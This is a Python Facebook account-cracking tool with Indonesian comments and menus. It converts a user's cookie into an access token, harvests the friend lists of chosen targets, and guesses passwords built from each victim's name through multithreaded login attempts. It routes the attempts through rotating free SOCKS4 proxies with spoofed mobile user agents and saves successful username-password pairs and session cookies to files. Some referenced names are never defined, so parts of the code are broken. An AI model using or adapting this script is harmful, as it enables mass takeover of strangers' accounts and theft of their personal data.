'''Update 23 Juni 2023
   Autor Raka Andrian Tara
   Github Bajingan-Z
'''
# * [ CHAT AINK ANJINK ] * #
def author(pm_aink):
	__raka_andrian___(f'{K} [{P}•{K}]{P} Tunggu Sebentar Nanti Diarahin Ke Facebook ...')
	time.sleep(3)
	os.system("xdg-open https://www.facebook.com/aa.raka27")
	back()
# * [ WARNA BENGET SIA ] * #
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
# * [ PRINTAH AWAL MALING ] * #
import requests,json,os,sys,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
apk_aktif = []
ualu,ualuh = [],[]
ugen = []
ugen2 = []
ugent = []
apk_tidak_aktif = []
raka_andrian_tara,king_off_raka = [],[]
owh_jelas_donk_aink_kan_cowok = []
raka1,raka2,raka3,raka4,raka,rakaxxx,uid,tokenku,akun,id,id2,ok,cp,loop = [],[],[],[],[],[],[],[],[],[],[],0,0,0
# * [ BAGIAN UGENT ] * #
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
realme = random.choice(["RMX2072","RMX2086","RMX3350"])

for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Build/'
	e=random.choice(["MMB29T","JZO54K","M1AJQ","KOT49H"])
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(73,112)
	h='0'
	i=random.randrange(4200,4900)
	j=random.randrange(40,150)
	k='Mobile Safari/534.36'
	l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge"])
	#l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
	m=random.randrange(1,9)
	n=random.randrange(1,9)
	o='0'
	p=random.randrange(5,20)
	uaku=(f'{a} {b}.{c}; {realme}) {d}{e}; wv) {f}{g}.{h}.{i}.{j} {k} {l}/{m}.{n}.{o}.{p}')
	ugen.append(uaku)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])

# * [ BULAN DAN BINTANG ] * #
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
# * [ PENYIMPAN FILE ] * #
raka_ok = 'RAKA_OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
raka_cp = 'RAKA_CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# * [ BANNER KUMAHA AINK ] * #
def ___raka_ganteng___():
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	clear()
	__raka_andrian___(f"""{h}
         ▄████  ▄▄▄        █████▒██▓
        ██▒ ▀█▒▒████▄    ▓██   ▒▓██▒
{k}       ▒██░▄▄▄░▒██  ▀█▄  ▒████ ░▒██▒
       ░▓█  ██▓░██▄▄▄▄██ ░▓█▒  ░░██░
{m}       ░▒▓███▀▒ ▓█   ▓██▒░▒█░   ░██░
        ░▒   ▒  ▒▒   ▓▒█░ ▒ ░   ░▓  
         ░   ░   ▒   ▒▒ ░ ░      ▒ ░""")    
	print("%s      ╔═════════════════════════════╗"%(Z))
	print("%s      ║%s  Github   : Bajingan-Z      %s║"%(Z,B,Z))
	print("%s      ║%s  Version  : %s3.0             %s║"%(Z,B,H,Z))
	print("%s      ╚═════════════════════════════╝"%(Z))
# * [ BAGIAN COOLI ] * #
def gafi_login():
	try:
		os.system('clear')
		___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
		ses = requests.Session()
		__raka_andrian___(f'{K} [{P}•{K}]{P} Gunakan Cookies Yang Masih Prawan...?')
		cookie=input(f'{K} [{P}•{K}]{P} Cookies :{K} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': cookie}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"{K} [{P}•{K}]{P} Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': cookie}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': cookie}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': cookie}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{K} [{P}•{K}]{P} Token : {K}{access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(cookie)
							__raka_andrian___(f"\n{K} [{P}•{K}]{P} Login Berhasil Jalankan Ulang Perintahnya ...");exit()
			except Exception as e:
				__raka_andrian___(f"{K} [{P}•{K}]{P} Cookies Mokad Kontol ...")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
# * [ BAGIAN COLMEXX ] * #
def rakaexde():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			tim_gafi = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			gafi_donk = json.loads(tim_gafi.text)['name']
			menu(gafi_donk)
		except KeyError:
			gafi_login()
		except requests.exceptions.ConnectionError:
			__raka_andrian___(f'{K} [{P}•{K}]{P} Jaringan Error')
			exit()
	except IOError:
		gafi_login()
# * [ MENU HIDANGAN ] * #
def menu(name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Cookies Kadaluarsa Kea Tt Jendes ')
		time.sleep(3)
		gafi_login()
	os.system('clear')
	___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	print()
	__raka_andrian___(f'{K} [{P}1{K}]{P} Publik\n{K} [{P}2{K}]{P} Publik Masal\n{K} [{P}3{K}]{P} Laporkan Bug\n{K} [{P}0{K}]{P} Keluar\n')
	_raka_andrian_tara_ = input(f'{K} [{P}•{K}]{P} Pilih  : ')
	if _raka_andrian_tara_ in ['01','1']:
		crack_publik()
	elif _raka_andrian_tara_ in ['02','2']:
		dump_massal()
	elif _raka_andrian_tara_ in ['03','3']:
		author('pm_aink')
	elif _raka_andrian_tara_ in ['00','0']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__raka_andrian___(f'{K} [{P}•{K}]{P} Succes Menghapus Cookie Good Bay...')
		time.sleep(3)
		exit()
	else:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Pilih Yang Benar Kentod...?')
		time.sleep(4)
		back()
# * [ CRACK PUBLIK ] * #
def crack_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print()
	aink_gabut = input(f'{K} [{P}•{K}]{P} Target : ')
	try:
		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
		for ricode_bang in aink_raka['friends']['data']:
			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
			except:continue
		__raka_andrian___(f'{K} [{P}•{K}]{P} Total  : '+str(len(id)))
		perintah()
	except requests.exceptions.ConnectionError:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Koneksi Internet Bermasalah')
	except (KeyError,IOError):
		__raka_andrian___(f'{K} [{P}•{K}]{P} Pertemanan Tidak Publik ')
		exit()
# * [ CRACK MASSAL ] * #
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'├──> Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'├──> ID Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("├──> Total DUMP  : "+str(len(id))) 
	      perintah()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
# * [ BAGIAN PEMERINTAH RI ] * #
def perintah():
	for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('')
	__raka_andrian___(f'{K} [{P}•{K}]{P} Ketik ({K}GAFI{P}) Untuk Mulai Crack')
	____method_crack____ = input(f'{K} [{P}•{K}]{P} Ketik  : {K}')
	if ____method_crack____ in ['Gafi','gafi','GAFI','gapi','GAPI','Gapi']:
		rakaxxx.append('async')
		print('')
	elif ____method_crack____ in ['']:
		__raka_andrian___(f'{K} [{P}•{K}]{P} Pilih Yang Bener ')
		perintah()
	else:
		rakaxxx.append('async')
	seting_password()
# * [ BAGIAN PASSWORD ] * #
def seting_password():
	global prog,des
	print('')
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as rakaANDRIAN:
			for kocak_euy in id2:
				idf,nmf = kocak_euy.split('|')[0],kocak_euy.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				afa_aja_boleh = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						afa_aja_boleh.append(nmf)
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
						afa_aja_boleh.append(frs+'123456')
						afa_aja_boleh.append(frs+'123456789')
				else:
					if len(frs)<3:
						afa_aja_boleh.append(nmf)
					else:
						afa_aja_boleh.append(nmf)
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
						afa_aja_boleh.append(frs+'123456')
						afa_aja_boleh.append(frs+'123456789')
				if 'ya' in raka_andrian_tara:
					for recode_aja in king_off_raka:
						afa_aja_boleh.append(recode_aja)
				else:pass
				if 'async' in rakaxxx:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh,'m.prod.facebook.com')
				else:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh,'m.prod.facebook.com')
		print('')
		print(f'{K} [{P}•{K}]{P} Hasil : %s\n{K} [{P}•{K}]{P} Hasil : %s'%(raka_ok,raka_cp))
		print('')
		print(f'{K} [{P}•{K}]{P} RAKA_OK : {H}%s '%(ok))
		print(f'{K} [{P}•{K}]{P} RAKA_CP : {K}%s '%(cp))
		print('')
# * [ METHODE NGOCOK ] * #
def _async_2_(idf,afa_aja_boleh,url):
	global loop,ok,cp
	rr = random.randint
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	rakaxtc = random.choice(["😛","😑","😝","😑","😛","😑","😝","😑","😛","😑","😝","😑","😛"])
	prog.update(des,description=f'\r  {rakaxtc} {P}{(loop)}/{len(id)} OK:{(ok)} CP:{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1037598786421557&kid_directed_site=0&app_id=1037598786421557&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fapp_id%3D1037598786421557%26cbt%3D1697813204885%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df190d73038fc8a8%2526domain%253Dwww.watsons.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.watsons.co.id%25252Ffc1d396b5ca104%2526relation%253Dopener%26client_id%3D1037598786421557%26display%3Dtouch%26domain%3Dwww.watsons.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.watsons.co.id%252Fen%252Flogin%26locale%3Den_US%26logger_id%3Df33ffeeb22db67%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3a91c9ed6e951%2526domain%253Dwww.watsons.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.watsons.co.id%25252Ffc1d396b5ca104%2526relation%253Dopener%2526frame%253Df15304b392543a%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv6.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3a91c9ed6e951%26domain%3Dwww.watsons.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.watsons.co.id%252Ffc1d396b5ca104%26relation%3Dopener%26frame%3Df15304b392543a%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v6.0/dialog/oauth?app_id=1037598786421557&cbt=1697813204885&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df190d73038fc8a8%26domain%3Dwww.watsons.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.watsons.co.id%252Ffc1d396b5ca104%26relation%3Dopener&client_id=1037598786421557&display=touch&domain=www.watsons.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.watsons.co.id%2Fen%2Flogin&locale=en_US&logger_id=f33ffeeb22db67&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3a91c9ed6e951%26domain%3Dwww.watsons.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.watsons.co.id%252Ffc1d396b5ca104%26relation%3Dopener%26frame%3Df15304b392543a&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2C+email&sdk=joey&version=v6.0&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1037598786421557&kid_directed_site=0&app_id=1037598786421557&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fapp_id%3D1037598786421557%26cbt%3D1697813204885%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df190d73038fc8a8%2526domain%253Dwww.watsons.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.watsons.co.id%25252Ffc1d396b5ca104%2526relation%253Dopener%26client_id%3D1037598786421557%26display%3Dtouch%26domain%3Dwww.watsons.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.watsons.co.id%252Fen%252Flogin%26locale%3Den_US%26logger_id%3Df33ffeeb22db67%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3a91c9ed6e951%2526domain%253Dwww.watsons.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.watsons.co.id%25252Ffc1d396b5ca104%2526relation%253Dopener%2526frame%253Df15304b392543a%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv6.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3a91c9ed6e951%26domain%3Dwww.watsons.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.watsons.co.id%252Ffc1d396b5ca104%26relation%3Dopener%26frame%3Df15304b392543a%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}>> {idf}|{pw}\n>> {ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}>> {idf}|{pw}\n>> {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
# * [ BAGIAN LAYAR TANCEP ] * #
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
# * [ KEMBALI KE LAPTOP ] * #
def back():
	rakaexde()
# * [ PENGANGUR JALAN 1 ] * #
def __raka_andrian___(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.007)
# * [ PENGANGGUR JALAN 2 ] * #
def __raka_andrian___2__(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.030)			
# * [ SYSTEM KONTOL ] * #
if __name__=='__main__':
	try:os.mkdir('RAKA_OK')
	except:pass
	try:os.mkdir('RAKA_CP')
	except:pass
	try:os.system('clear')
	except:pass
	rakaexde()